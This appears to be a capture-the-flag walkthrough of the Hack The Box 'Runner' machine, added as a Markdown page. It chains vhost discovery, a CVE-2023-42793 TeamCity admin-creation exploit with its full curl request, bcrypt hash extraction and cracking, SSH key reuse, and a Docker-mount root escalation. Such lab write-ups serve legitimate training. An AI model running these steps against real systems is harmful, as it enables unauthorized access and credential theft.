@@ -1,0 +1,246 @@
+---
+title: Runner
+banner: /avatars/runner.webp
+difficulty: medium
+os: linux
+releaseDate: 2023-12-09
+pwnDate: 2024-04-28
+slug: "runner"
+achievement: https://www.hackthebox.com/achievement/machine/701907/598
+---
+
+import Browser from "@/components/Browser.astro" 
+
+## Enumeration
+
+
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.13 -oG allPorts
+
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack ttl 63
+80/tcp   open  http     syn-ack ttl 63
+8000/tcp open  http-alt syn-ack ttl 63
+```
+
+```bash
+sudo nmap -p22,80,8000 -sCV 10.10.11.13 -oN targeted
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http        nginx 1.18.0 (Ubuntu)
+|_http-title: Runner - CI/CD Specialists
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8000/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Site doesn\'t have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+```bash
+sudo echo "10.10.11.13 runner.htb" >> /etc/hosts
+```
+
+<Browser
+  url="runner.htb"
+  src="/walkthroughs/runner/0.png"
+/>
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://runner.htb/FUZZ" -mc "all" -fc 404
+
+assets                  [Status: 301, Size: 178, Words: 6, Lines: 8]
+index.html              [Status: 200, Size: 16910, Words: 4339, Lines: 392]
+```
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://runner.htb:8000/FUZZ" -mc "all" -fc 404
+
+health                  [Status: 200, Size: 3, Words: 1, Lines: 2]
+version                 [Status: 200, Size: 9, Words: 1, Lines: 1]
+```
+
+## Foothold
+
+https://github.com/digininja/CeWL
+
+```bash
+./cewl.rb http://runner.htb/ -d 4 --with-numbers --lowercase -w wordlist.txt
+```
+
+```bash
+ffuf -w wordlist.txt:FUZZ -u "http://runner.htb" -H "HOST: FUZZ.runner.htb" -mc "all" -fs 154
+
+teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2]
+```
+
+<Browser
+  url="teamcity.runner.htb/login.html"
+  src="/walkthroughs/runner/1.png"
+/>
+
+## Exploitation
+
+[exploit](https://www.exploit-db.com/exploits/51884)
+
+```bash
+python3 exploit.py -u "http://teamcity.runner.htb" -v
+
+=====================================================
+*       CVE-2023-42793                              *
+*  TeamCity Admin Account Creation                  *   
+*                                                   *
+*  Author: ByteHunter                               *
+=====================================================
+
+Token: eyJ0eXAiOiAiVENWMiJ9.eGZtQThiVXdLLVZnVnFkajhiMWtieFRJemhB.OTUwZTFhZmQtNzFlOS00ZjcwLTgwNDctNmNmOGNmYzE0MmZk
+Successfully exploited!
+URL: http://teamcity.runner.htb
+Username: city_admin4gdi
+Password: Main_password!!**
+Final curl command: curl --path-as-is -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.eGZtQThiVXdLLVZnVnFkajhiMWtieFRJemhB.OTUwZTFhZmQtNzFlOS00ZjcwLTgwNDctNmNmOGNmYzE0MmZk" -X POST http://teamcity.runner.htb/app/rest/users -H "Content-Type: application/json" --data '{"username": "city_admin4gdi", "password": "theSecretPass!", "email": "nest@nest", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
+```
+
+<Browser
+  url="teamcity.runner.htb/admin/admin.html?item=users"
+  src="/walkthroughs/runner/2.png"
+/>
+
+| Username | Name | Email | Groups | Role | 
+| -------- | ---- | ----- | ------ | ---- |
+| admin    | John | john@runner.htb | All Users | `System administrator`, `Project developer` | 
+| city_admin4gdi | N/A | angry-admin@funnybunny.org | All Users | `System administrator`, `Project developer` | 
+| matthew  | Matthew | matthew@runner.htb | All Users | `Project developer` |
+
+## Post Exploitation
+
+<Browser
+  url="teamcity.runner.htb/admin/admin.html?item=backup"
+  src="/walkthroughs/runner/3.png"
+/>
+
+```bash
+sudo grep -r 'john' ./
+[sudo] password for hector: 
+./database_dump/comments:201, -42, 1709746543407, "New username: \'admin\', new name: \'John\', new email: \'john@runner.htb\'"
+./database_dump/users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1714253035134, BCRYPT
+```
+
+```bash
+hashid -m john.txt
+--File 'john.txt'--
+Analyzing '$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye'
+[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt [Hashcat Mode: 3200]
+--End of file 'john.txt'--%
+```
+
+```bash
+hashcat -m 3200 -a 0 john.txt /usr/share/wordlists/rockyou.txt
+```
+
+```bash
+sudo grep -r 'matthew' ./
+./database_dump/vcs_username:2, anyVcs, -1, 0, matthew
+./database_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
+```
+
+```bash
+hashid -m matthew.txt
+--File 'matthew.txt'--
+Analyzing '$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em'
+[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt [Hashcat Mode: 3200]
+--End of file 'matthew.txt'--
+```
+
+```bash
+hashcat -m 3200 -a 0 matthew.txt /usr/share/wordlists/rockyou.txt --show
+
+$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
+```
+
+in `config/projects/AllProjects/pluginData/ssh_keys` we found a private key
+
+```bash
+sudo ssh -i ./id_rsa john@runner.htb
+```
+
+```bash
+john@runner:~$ cat user.txt 
+46f036b2e01683b1eb24ed7c190d28a0
+```
+
+## Lateral Movement
+
+```bash
+sudo ssh -i ./id_rsa john@runner.htb
+```
+
+```bash
+john@runner:~$ netstat -peanut
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      0          23447      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          23378      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          23321      -                   
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      0          24526      -                   
+tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      0          24547      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        21331      -                   
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      0          23449      -                   
+tcp        0    272 10.10.11.13:22          10.10.14.5:48668        ESTABLISHED 0          2498826    -                   
+tcp        0      1 10.10.11.13:32808       8.8.8.8:53              SYN_SENT    102        2498825    -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      0          23379      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      0          23332      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      0          23755      -                   
+udp        0      0 127.0.0.1:40020         127.0.0.53:53           ESTABLISHED 104        2499691    -                   
+udp        0      0 10.10.11.13:50405       8.8.8.8:53              ESTABLISHED 102        2493947    -                   
+udp        0      0 10.10.11.13:50557       8.8.8.8:53              ESTABLISHED 102        2493946    -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        21330      -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          21796      -
+```
+
+```bash
+sudo ssh -L 9000:localhost:9000 -i ./id_rsa john@runner.htb
+```
+
+<Browser
+  url="localhost:9000/#!/home"
+  src="/walkthroughs/runner/4.png"
+/>
+
+## Privilege Escalation
+
+<Browser
+  url="localhost:9000/#!/1/docker/volumes"
+  src="/walkthroughs/runner/5.png"
+/>
+
+<Browser
+  url="localhost:9000/#!/1/docker/containers/new"
+  src="/walkthroughs/runner/6.png"
+/>
+
+<Browser
+  url="localhost:9000/#!/1/docker/containers/new"
+  src="/walkthroughs/runner/7.png"
+/>
+
+<Browser
+  url="localhost:9000/#!/1/docker/containers/new"
+  src="/walkthroughs/runner/8.png"
+/>
+
+<Browser
+  url="localhost:9000/#!/1/docker/containers/34bd45e1192ea7fb7738a396823f4ec9c9edadf5b83c22cedd1074d3b2120f48/exec"
+  src="/walkthroughs/runner/9.png"
+/>
+
+```bash
+root@34bd45e1192e:/mnt/root/root# cat root.txt
+40d794acdf1f285161e72b1a89f89a88
+```
